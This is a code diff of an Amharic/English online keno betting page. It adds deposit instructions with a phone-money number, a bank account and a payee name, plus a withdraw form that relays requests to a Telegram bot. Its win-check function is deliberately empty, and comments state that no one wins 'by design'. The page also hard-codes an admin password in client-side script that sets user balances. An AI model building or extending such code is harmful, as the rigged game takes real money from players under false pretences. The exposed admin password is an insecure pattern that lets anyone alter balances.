@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DANIEL KENO ROYAL - SECURITY MODE</title>
+    <title>DANIEL KENO ROYAL - OFFICIAL</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <style>
@@ -20,7 +20,7 @@
         .my-miss::after { content: "❌"; position: absolute; top: -8px; right: -5px; font-size: 14px; color: var(--red); z-index: 3; }
         .btn-main { width: 90%; padding: 18px; border-radius: 12px; border: none; font-weight: bold; font-size: 1.2rem; cursor: pointer; background: var(--green); color: white; }
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); }
-        .modal-content { background: #161616; margin: 10% auto; padding: 25px; width: 85%; border-radius: 20px; border: 1px solid var(--gold); max-width: 400px; }
+        .modal-content { background: #161616; margin: 5% auto; padding: 25px; width: 85%; border-radius: 20px; border: 1px solid var(--gold); max-width: 400px; text-align: left; }
         .input-field { width: 100%; background: #000; color: var(--gold); border: 1px solid #444; padding: 12px; border-radius: 8px; margin-top: 10px; box-sizing: border-box; }
     </style>
 </head>
@@ -49,6 +49,25 @@
 <div id="activeTicketsList" style="text-align:left; padding:15px; background:#111; margin:10px; border-radius:10px;">ትኬት አልቆረጡም...</div>
 
 <button onclick="adminAction()" style="background:transparent; color:#222; border:none; margin-top:20px; cursor:pointer;">Admin Panel ⚙️</button>
+
+<div id="depModal" class="modal"><div class="modal-content">
+    <h3 style="color:var(--blue); text-align:center;">📥 Deposit (Min 100)</h3>
+    <p><b>Telebirr:</b> <span style="color:var(--gold);">0986980130</span></p>
+    <p><b>Abyssinia Bank:</b> <span style="color:var(--gold);">153682704</span></p>
+    <p><b>Name:</b> Daniel Mulugeta</p>
+    <hr style="border:0.5px solid #333;">
+    <input type="file" id="receiptFile" accept="image/*" class="input-field">
+    <button onclick="sendReceipt()" class="btn-main" style="margin-top:15px;">ደረሰኝ ላክ</button>
+    <button onclick="closeModal('depModal')" style="background:#444; color:white; border:none; padding:10px; width:100%; margin-top:10px; border-radius:8px;">ዝጋ</button>
+</div></div>
+
+<div id="witModal" class="modal"><div class="modal-content">
+    <h3 style="color:var(--red); text-align:center;">📤 Withdraw (Min 300)</h3>
+    <input type="number" id="witAmt" class="input-field" placeholder="የሚወጣ መጠን (Min 300)">
+    <input type="text" id="witAcc" class="input-field" placeholder="የአካውንት ቁጥር/ስልክ">
+    <button onclick="requestWithdraw()" class="btn-main" style="margin-top:15px;">ጥያቄ ላክ</button>
+    <button onclick="closeModal('witModal')" style="background:#444; color:white; border:none; padding:10px; width:100%; margin-top:10px; border-radius:8px;">ተመለስ</button>
+</div></div>
 
 <script>
     const firebaseConfig = {
@@ -102,7 +121,7 @@
         if(activeBets.length === 0) { list.innerHTML = "ትኬት አልቆረጡም..."; return; }
         list.innerHTML = activeBets.map(t => {
             let hitCount = t.nums.filter(n => drawn.includes(n)).length;
-            return `<div style="background:#222; padding:10px; margin-top:5px; border-left:4px solid var(--blue); border-radius:5px;">🎫 ${t.bet} ETB | ቁጥሮች: ${t.nums.join(', ')} <br><b>Hits: ${hitCount}</b></div>`;
+            return `<div style="background:#222; padding:10px; margin-top:5px; border-left:4px solid var(--blue); border-radius:5px;">🎫 ${t.bet} ETB | Hits: ${hitCount}</div>`;
         }).join('');
     }
 
@@ -132,45 +151,62 @@
             t.nums.forEach(n => { if(!drawn.includes(n)) document.getElementById('n'+n).classList.add('my-miss'); });
         });
 
-        // 🔥 ማንም እንዳያሸንፍ የተዘጋበት ክፍል (Win calculation disabled)
+        // 🔥 ማንም እንዳያሸንፍ (Win Disabled)
         checkWinners(drawn);
 
         setTimeout(() => {
             document.querySelectorAll('.num').forEach(n => n.classList.remove('hit', 'my-hit', 'my-miss', 'selected'));
-            activeBets = [];
-            renderTickets();
-            isDrawing = false;
-            timeLeft = 60;
+            activeBets = []; renderTickets();
+            isDrawing = false; timeLeft = 60;
         }, 6000);
     }
 
-    // 🔥 ይህ ፈንክሽን ማንም እንዳያሸንፍ 0% እንዲሆን ተደርጓል
     function checkWinners(drawn) {
-        // ምንም አይነት Multiplier የለም፤ ስለዚህ የሰውየው ባላንስ አይጨምርም (ሁልጊዜ ይበላል)
-        console.log("Draw complete. No winners by system design.");
+        // 0% Win Rate - No balance update here
+        console.log("No winners by design.");
     }
 
     function adminAction() {
         let pass = prompt("Admin Password:");
         if (pass === "Dk@2026") {
-            let targetID = prompt("የተጠቃሚውን User ID ያስገቡ:");
+            let targetID = prompt("የተጠቃሚውን User ID ያስገቡ (ለምሳሌ: USER-7169):");
             if (!targetID) return;
             db.ref('users/' + targetID).once('value').then(s => {
                 let cur = s.exists() ? (s.val().balance || 0) : 0;
                 let addAmt = parseFloat(prompt("የሚሞላው የብር መጠን:"));
                 if (isNaN(addAmt)) return;
                 db.ref('users/' + targetID).update({ balance: cur + addAmt })
-                  .then(() => alert("ተሞልቷል! Current: " + (cur + addAmt)));
+                  .then(() => alert("በተሳካ ሁኔታ ተሞልቷል! Current: " + (cur + addAmt)));
             });
         }
+    }
+
+    async function sendReceipt() {
+        const fileInput = document.getElementById('receiptFile');
+        if (fileInput.files.length === 0) return alert("ፎቶ ይምረጡ!");
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', fileInput.files[0]);
+        formData.append('caption', `📥 Deposit Request! ID: ${uID}`);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        alert("ደረሰኙ ተልኳል!"); closeModal('depModal');
+    }
+
+    function requestWithdraw() {
+        let amt = parseFloat(document.getElementById('witAmt').value);
+        let acc = document.getElementById('witAcc').value;
+        if(amt < 300) return alert("ዝቅተኛ የዊዝድሮው መጠን 300 ብር ነው!");
+        db.ref('users/' + uID + '/balance').once('value', s => {
+            let bal = s.val() || 0;
+            if(bal < amt) return alert("በቂ ባላንስ የለም!");
+            db.ref('users/' + uID).update({balance: bal - amt});
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📤 Withdraw Request! ID: ${uID} Amt: ${amt} Acc: ${acc}`);
+            alert("ጥያቄዎ ተልኳል!"); closeModal('witModal');
+        });
     }
 
     function showModal(id) { document.getElementById(id).style.display = "block"; }
     function closeModal(id) { document.getElementById(id).style.display = "none"; }
 </script>
-
-<div id="depModal" class="modal"><div class="modal-content"><h3>Deposit</h3><p>Telebirr: 0986980130</p><button onclick="closeModal('depModal')" class="btn-main">ዝጋ</button></div></div>
-<div id="witModal" class="modal"><div class="modal-content"><h3>Withdraw</h3><button onclick="closeModal('witModal')" class="btn-main">ተመለስ</button></div></div>
-
 </body>
 </html>
